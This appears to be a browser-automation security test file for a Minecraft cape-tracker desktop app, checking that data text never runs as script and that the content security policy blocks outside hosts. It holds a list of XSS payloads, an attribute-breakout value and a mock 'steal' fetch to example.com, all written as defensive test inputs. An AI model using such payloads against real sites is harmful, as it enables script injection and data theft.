// Task 7: security.
// 1. Text from the data file can never run as code: every text field filled with HTML and script tricks.
// 2. The app's security policy (tauri.conf.json "csp") lets the page reach only what it needs, and blocks
//    everything else; the whole app still works under it (pictures, figure, title effect, dialogs, links).
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { launch, EDGE } from '../lib/edge.mjs';
import { fakeTauri } from '../lib/fake-tauri.mjs';
import { sampleData, ev } from '../lib/shell-sandbox.mjs';
import { serveApp } from '../lib/serve-app.mjs';
import { testCape } from '../lib/png.mjs';

const skip = !EDGE && 'Microsoft Edge not found';
let edge, server;
before(async () => { if (skip) return; edge = await launch(); server = await serveApp(); });
after(async () => { await edge?.close(); await server?.close(); });

const CATCH = `window.__csp = []; document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.effectiveDirective + ' ' + e.blockedURI));`;
async function open(data, greeting = 'none') {
  const page = await edge.newPage();
  await page.block(['*mojang.com*']);
  await page.route('https://textures.minecraft.net/*', () => ({ body: testCape(200, 60, 60), type: 'image/png' }));
  await page.init(CATCH);
  await page.init(fakeTauri({ data, greeting }));
  await page.goto(server.url + 'index.html');
  return page;
}

// ---------- 1. data text never runs ----------
const EVIL = [
  '<img src=x onerror="window.__pwned=1">',
  '<script>window.__pwned=2<\/script>',
  '"><svg onload="window.__pwned=3">',
  "javascript:window.__pwned=4",
  '**<b onmouseover="window.__pwned=5">bold</b>**',
  '{{constructor.constructor("window.__pwned=6")()}}'
].join(' ');

function evilData() {
  const d = sampleData({ events: { x: { ...ev('evil" onclick="x', 'new', new Date().toISOString()), textEn: EVIL, capeName: EVIL } } });
  d.capes['evil" onclick="x'] = {
    name: EVIL, wikiTitle: 'javascript:window.__pwned=7', apiAlias: EVIL, availability: 'available', availableUntil: '2099-01-01',
    category: EVIL, cost: 'free', editions: ['java', EVIL], releaseDate: '2026-10-01', obtainEn: EVIL, shortEn: EVIL,
    approx: { releaseDate: { en: EVIL } }, textureUrl: 'javascript:window.__pwned=8'
  };
  d.status.lastCheckAt = EVIL;
  return d;
}

test('text from the data file is shown as text, never run, in every place it appears', { skip }, async () => {
  const page = await open(evilData());
  await page.waitFor(`document.querySelectorAll('#grid .tile').length === 3`);
  await page.click('#live .live-card[data-cape^="evil"] .slot');               // the detail window of the evil cape
  await page.waitFor(`document.getElementById('dlg').open`);
  await page.eval(`document.querySelectorAll('a, button, [onmouseover]').forEach(e => e.dispatchEvent(new MouseEvent('mouseover', { bubbles: true })))`);
  await new Promise((r) => setTimeout(r, 500));
  assert.equal(await page.eval('window.__pwned ?? null'), null, 'no payload ran');
  assert.equal(await page.eval(`document.querySelectorAll('[onerror], [onload], [onclick], [onmouseover], svg').length`), 0, 'no element made from data text');
  assert.equal(await page.eval(`document.querySelectorAll('script').length`), await page.eval(`document.querySelectorAll('script[src], body > script').length`), 'no extra script tags');
  assert.ok(await page.eval(`document.getElementById('dlg-title').textContent.includes('<img src=x onerror=')`), 'the name is shown literally');
  assert.ok(await page.eval(`[...document.querySelectorAll('#dlg-actions a')].every(a => a.href.startsWith('https://minecraft.wiki/w/'))`), 'the wiki link stays on the wiki');
  assert.deepEqual(page.exceptions, []);
  await page.close();
});

// ---------- 2. the security policy ----------
test('under the app security policy everything works and nothing is blocked', { skip }, async () => {
  const d = sampleData();
  d.capes['test-alpha'].textureId = 'aaaa0000aaaa0000aaaa0000aaaa0000aaaa0000aaaa0000aaaa0000aaaa0000';
  d.capes['test-beta'].textureId = 'bbbb0000bbbb0000bbbb0000bbbb0000bbbb0000bbbb0000bbbb0000bbbb0000';
  const page = await open(d, 'greet');                                           // with the title effect and sound
  await page.waitFor(`document.querySelectorAll('#grid .tile').length === 2`);
  await page.waitFor(`document.querySelectorAll('#grid .tile img.gen').length === 2`, 30000);   // pictures drawn (data: images)
  await page.waitFor(`__test.logs.some(l => /\\[Title\\] glow: start/.test(l))`, 15000);
  await page.click('#grid .tile .slot');
  await page.waitFor(`document.getElementById('dlg').open`);
  await page.click('#dlg-close');
  await page.click('#cw-open-settings');                                          // the dialog's own styles are added at run time
  await page.waitFor(`document.getElementById('cw-settings')?.open`);
  assert.equal(await page.eval(`getComputedStyle(document.querySelector('.cw-set')).display`), 'grid', 'the settings dialog has its styles');
  await page.click('#cw-settings [value=save]');
  await page.click('#donate');
  assert.equal(await page.eval('__test.opened'), 'https://paypal.me/Kayoiz', 'links open in the browser');
  assert.equal(await page.eval(`getComputedStyle(document.querySelector('.live-name')).fontFamily.includes('CapeWatch Pixel')`), true);
  await new Promise((r) => setTimeout(r, 1500));
  assert.deepEqual(await page.eval('window.__csp'), [], 'nothing blocked');
  assert.ok(await page.eval(`CapeWatchPage.cape3d.viewer.renderer.info.render.frame > 0`), 'the figure draws');
  assert.deepEqual(page.exceptions, []);
  await page.close();
});

test('the policy is really on: an address the app does not use is blocked, and the block is logged', { skip }, async () => {
  const page = await open(sampleData());
  await page.waitFor(`document.querySelectorAll('#grid .tile').length === 2`);
  const fetched = await page.eval(`fetch('https://example.com/steal?x=1').then(() => 'reached', () => 'blocked')`);
  assert.equal(fetched, 'blocked');
  await page.eval(`new Promise(r => { const i = new Image(); i.onerror = r; i.onload = r; i.src = 'https://example.com/pixel.png'; })`);
  await new Promise((r) => setTimeout(r, 300));
  const blocked = await page.eval('window.__csp');
  assert.ok(blocked.some((b) => /^connect-src https:\/\/example\.com/.test(b)), 'fetch blocked');
  assert.ok(blocked.some((b) => /^img-src https:\/\/example\.com/.test(b)), 'image blocked');
  assert.ok((await page.eval('__test.logs')).some((l) => /blocked by the security policy: connect-src https:\/\/example\.com/.test(l)), 'written to the app log');
  await page.close();
});

test('the page only contacts its own files and the texture server (no Google fonts)', { skip }, async () => {
  const d = sampleData();
  d.capes['test-alpha'].textureId = 'aaaa0000aaaa0000aaaa0000aaaa0000aaaa0000aaaa0000aaaa0000aaaa0000';
  const page = await open(d);
  await page.waitFor(`document.querySelectorAll('#grid .tile img.gen').length === 1`, 30000);
  const hosts = [...new Set(page.requests.map((u) => { try { const x = new URL(u); return x.protocol === 'data:' ? 'data:' : x.host; } catch { return u; } }))].sort();
  const allowed = new Set([new URL(server.url).host, 'textures.minecraft.net', 'data:']);   // fonts ship with the app
  assert.deepEqual(hosts.filter((h) => !allowed.has(h)), [], 'unexpected: ' + hosts.join(', '));
  await page.close();
});
